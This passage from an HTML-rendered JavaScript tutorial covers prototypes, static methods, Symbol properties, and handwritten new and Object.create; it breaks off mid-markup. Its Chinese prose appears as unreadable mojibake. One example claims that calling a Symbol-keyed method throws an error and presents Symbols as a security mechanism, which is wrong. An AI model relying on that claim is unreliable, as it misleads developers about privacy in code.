class="hljs-title function_">method</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">_get</span>(<span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>), <span class="hljs-string">&quot;parentMethod&quot;</span>, <span class="hljs-variable language_">this</span>).<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Child</span>;<br>&#125;)(<span class="hljs-title class_">Parent</span>);<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å…³é”®å¸®åŠ©å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">_getPrototypeOf</span>(<span class="hljs-params">o</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(o);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>  <span class="hljs-comment">// æ¨¡æ‹Ÿ super å±æ€§æŸ¥æ‰¾</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Reflect</span> !== <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title class_">Reflect</span>.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property, receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> base = <span class="hljs-title function_">_getPrototypeOf</span>(target);<br>  <span class="hljs-keyword">if</span> (!base) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">var</span> desc = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(base, property);<br>  <span class="hljs-keyword">if</span> (desc.<span class="hljs-property">get</span>) &#123;<br>    <span class="hljs-keyword">return</span> desc.<span class="hljs-property">get</span>.<span class="hljs-title function_">call</span>(receiver || <span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> base[property];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-3-é™æ€æ–¹æ³•ä¸åŸå‹çš„å…³ç³»"><a href="#9-3-é™æ€æ–¹æ³•ä¸åŸå‹çš„å…³ç³»" class="headerlink" title="9.3 é™æ€æ–¹æ³•ä¸åŸå‹çš„å…³ç³»"></a>9.3 é™æ€æ–¹æ³•ä¸åŸå‹çš„å…³ç³»</h2><p>é™æ€æ–¹æ³•æ˜¯ JavaScript ç±»ä¸­ç›´æ¥ç»‘å®šåˆ°æ„é€ å‡½æ•°æœ¬èº«è€ŒéåŸå‹ä¸Šçš„æ–¹æ³•</p><p><strong>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">é™æ€æ–¹æ³•</th><th align="left">åŸå‹æ–¹æ³•</th></tr></thead><tbody><tr><td align="left">å­˜å‚¨ä½ç½®</td><td align="left">æ„é€ å‡½æ•°æœ¬èº«</td><td align="left">æ„é€ å‡½æ•°çš„ prototype å¯¹è±¡</td></tr><tr><td align="left">è°ƒç”¨æ–¹å¼</td><td align="left">é€šè¿‡ç±»åè°ƒç”¨ï¼ˆClassName.method()ï¼‰</td><td align="left">é€šè¿‡å®ä¾‹è°ƒç”¨ï¼ˆinstance.method()ï¼‰</td></tr><tr><td align="left">this æŒ‡å‘</td><td align="left">ç±»æ„é€ å‡½æ•°</td><td align="left">å®ä¾‹å¯¹è±¡</td></tr><tr><td align="left">ç»§æ‰¿è¡Œä¸º</td><td align="left">å¯è¢«å­ç±»ç»§æ‰¿</td><td align="left">å®ä¾‹å¯è®¿é—®</td></tr><tr><td align="left">ä½¿ç”¨åœºæ™¯</td><td align="left">å·¥å…·æ–¹æ³•&#x2F;å·¥å‚æ–¹æ³•</td><td align="left">å®ä¾‹ç›¸å…³æ“ä½œ</td></tr></tbody></table><p><strong>å†…å­˜ç»“æ„ä¸åŸå‹é“¾åˆ†æ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">prototypeMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å†…å­˜ç»“æ„ç­‰ä»·äºï¼š</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyClass</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-comment">// é™æ€æ–¹æ³•ï¼ˆç›´æ¥æŒ‚è½½æ„é€ å‡½æ•°ï¼‰</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property">staticMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Static&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// åŸå‹æ–¹æ³•</span><br><span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">prototypeMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Prototype&#x27;</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>åº•å±‚å®ç°ï¼ˆBabel è½¬è¯‘ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é™æ€æ–¹æ³•ç»§æ‰¿çš„å®ç°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_inherits</span>(<span class="hljs-params">subClass, superClass</span>) &#123;<br>  <span class="hljs-comment">// è®¾ç½®åŸå‹ç»§æ‰¿</span><br>  subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  <br>  <span class="hljs-comment">// å¤åˆ¶é™æ€æ–¹æ³•</span><br>  <span class="hljs-keyword">if</span> (superClass) &#123;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-property">setPrototypeOf</span> <br>      ? <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(subClass, superClass)<br>      : subClass.<span class="hljs-property">__proto__</span> = superClass;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-4-ç¬¦å·å±æ€§ï¼ˆSymbolï¼‰å¯¹åŸå‹çš„å½±å“"><a href="#9-4-ç¬¦å·å±æ€§ï¼ˆSymbolï¼‰å¯¹åŸå‹çš„å½±å“" class="headerlink" title="9.4 ç¬¦å·å±æ€§ï¼ˆSymbolï¼‰å¯¹åŸå‹çš„å½±å“"></a>9.4 ç¬¦å·å±æ€§ï¼ˆSymbolï¼‰å¯¹åŸå‹çš„å½±å“</h2><p><strong>Symbol åœ¨åŸå‹ç³»ç»Ÿä¸­çš„è¡Œä¸º</strong></p><p>ï¼ˆ1ï¼‰åŸå‹ä¸Šçš„ Symbol å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> customMethod = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;custom&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  [customMethod]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Symbol method called&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>instance[customMethod](); <span class="hljs-comment">// &quot;Symbol method called&quot;</span><br><br><span class="hljs-comment">// æ£€æŸ¥åŸå‹é“¾</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(customMethod <span class="hljs-keyword">in</span> <span class="hljs-title class_">MyClass</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance.<span class="hljs-title function_">hasOwnProperty</span>(customMethod)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å†…ç½® Symbol ä¸åŸå‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomIterable</span> &#123;<br>  *[<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">iterator</span>]() &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>;<br>  &#125;<br>&#125;<br><br>[...<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomIterable</span>()]; <span class="hljs-comment">// [1, 2, 3]</span><br></code></pre></td></tr></table></figure><p><strong>Symbol å¯¹åŸå‹ç³»ç»Ÿçš„ç‰¹æ®Šå½±å“</strong></p><p>ï¼ˆ1ï¼‰é¿å…å±æ€§åå†²çª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸åŒåº“å®‰å…¨æ‰©å±•åŸå‹</span><br><span class="hljs-keyword">const</span> lib1Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib1&#x27;</span>);<br><span class="hljs-keyword">const</span> lib2Method = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;lib2&#x27;</span>);<br><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib1Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib1å®ç° */</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[lib2Method] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* Lib2å®ç° */</span> &#125;;<br><br><span class="hljs-comment">// äº’ä¸å¹²æ‰°</span><br>[][lib1Method]();<br>[][lib2Method]();<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰éšè—åŸå‹æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> internalLogic = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;internal&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureAPI</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span> = <span class="hljs-string">&#x27;safe&#x27;</span>;<br>  &#125;<br>  <br>  [internalLogic]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;å†…éƒ¨å¤„ç†é€»è¾‘&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">publicMethod</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[internalLogic]();<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">publicData</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureAPI</span>();<br>api.<span class="hljs-title function_">publicMethod</span>(); <span class="hljs-comment">// æ­£å¸¸å·¥ä½œ</span><br>api[internalLogic](); <span class="hljs-comment">// æŠ¥é”™ï¼šé™¤éèƒ½è·å–Symbolå¼•ç”¨</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ä¸å¯æšä¸¾æ€§å¯¹åŸå‹éå†çš„å½±å“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;test&#x27;</span>)] = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br><br><span class="hljs-comment">// ä¸å½±å“å¸¸è§„éå†</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// æ— è¾“å‡ºï¼ˆæ— æšä¸¾å±æ€§ï¼‰</span><br>&#125;<br><br><span class="hljs-comment">// ä¹Ÿä¸å½±å“Object.keys</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// ä¸åŒ…å«Symbolå±æ€§</span><br></code></pre></td></tr></table></figure><p><strong>å†…ç½® Symbol ä¸åŸå‹è¡Œä¸ºå®šåˆ¶</strong></p><p>ï¼ˆ1ï¼‰Symbol.hasInstance</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySpecialArray</span> &#123;<br>  <span class="hljs-keyword">static</span> [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">hasInstance</span>](instance) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(instance);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MySpecialArray</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰Symbol.species</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArray</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Array</span> &#123;<br>  <span class="hljs-keyword">static</span> get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>; <span class="hljs-comment">// æ§åˆ¶è¡ç”Ÿå¯¹è±¡çš„æ„é€ å‡½æ•°</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyArray</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-keyword">const</span> mapped = myArr.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x*<span class="hljs-number">2</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">MyArray</span>); <span class="hljs-comment">// false</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mapped <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰Symbol.toStringTag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCollection</span> &#123;<br>  get [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;MyCollection&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCollection</span>().<span class="hljs-title function_">toString</span>()); <br><span class="hljs-comment">// &quot;[object MyCollection]&quot;</span><br></code></pre></td></tr></table></figure><p><strong>Symbol å±æ€§çš„ç»§æ‰¿</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parentSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;parent&#x27;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  [parentSymbol]() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Parent symbol method&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;&#125;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();<br>child[parentSymbol](); <span class="hljs-comment">// &quot;Parent symbol method&quot;</span><br><br><span class="hljs-comment">// æ£€æŸ¥ç»§æ‰¿å…³ç³»</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(<span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>).<span class="hljs-title function_">includes</span>(parentSymbol)<br>); <span class="hljs-comment">// falseï¼ˆç»§æ‰¿è€Œéè‡ªæœ‰ï¼‰</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬åç« ï¼šå®æˆ˜ä¸é¢è¯•é¢˜è§£æ"><a href="#ç¬¬åç« ï¼šå®æˆ˜ä¸é¢è¯•é¢˜è§£æ" class="headerlink" title="ç¬¬åç« ï¼šå®æˆ˜ä¸é¢è¯•é¢˜è§£æ"></a>ç¬¬åç« ï¼šå®æˆ˜ä¸é¢è¯•é¢˜è§£æ</h1><h2 id="10-1-æ‰‹å†™-new-æ“ä½œç¬¦å®ç°"><a href="#10-1-æ‰‹å†™-new-æ“ä½œç¬¦å®ç°" class="headerlink" title="10.1 æ‰‹å†™Â newÂ æ“ä½œç¬¦å®ç°"></a>10.1 æ‰‹å†™Â <code>new</code>Â æ“ä½œç¬¦å®ç°</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) &#123;<br>  <span class="hljs-comment">// éªŒè¯è¾“å…¥</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;First argument must be a function&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡å¹¶è®¾ç½®åŸå‹</span><br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  <br>  <span class="hljs-comment">// æ‰§è¡Œæ„é€ å‡½æ•°</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);<br>  <br>  <span class="hljs-comment">// å¤„ç†è¿”å›å€¼</span><br>  <span class="hljs-keyword">return</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;object&#x27;</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;function&#x27;</span>))<br>    ? result <br>    : obj;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-2-æ‰‹å†™-Object-create"><a href="#10-2-æ‰‹å†™-Object-create" class="headerlink" title="10.2 æ‰‹å†™Â Object.create"></a>10.2 æ‰‹å†™Â <code>Object.create</code></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myObjectCreate</span>(<span class="hljs-params">proto</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; proto !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Object prototype may only be an Object or null&#x27;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"></span>) &#123;&#125;<br>  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Parent&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> child = <span class="hljs-title function_">myObjectCreate</span>(parent);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(child.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Parent&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(child) === parent); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="10-3-å¦‚ä½•å®ç°ä¸€ä¸ªå®Œç¾çš„æ·±æ‹·è´ï¼ˆå¤„ç†åŸå‹é“¾ï¼‰"><a href="#10-3-å¦‚ä½•å®ç°ä¸€ä¸ªå®Œç¾çš„æ·±æ‹·è´ï¼ˆå¤„ç†åŸå‹é“¾ï¼‰" class="headerlink" title="10.3 å¦‚ä½•å®ç°ä¸€ä¸ªå®Œç¾çš„æ·±æ‹·è´ï¼ˆå¤„ç†åŸå‹é“¾ï¼‰"></a>10.3 å¦‚ä½•å®ç°ä¸€ä¸ªå®Œç¾çš„æ·±æ‹·è´ï¼ˆå¤„ç†åŸå‹é“¾ï¼‰</h2><p><strong>å®Œæ•´ä»£ç </strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 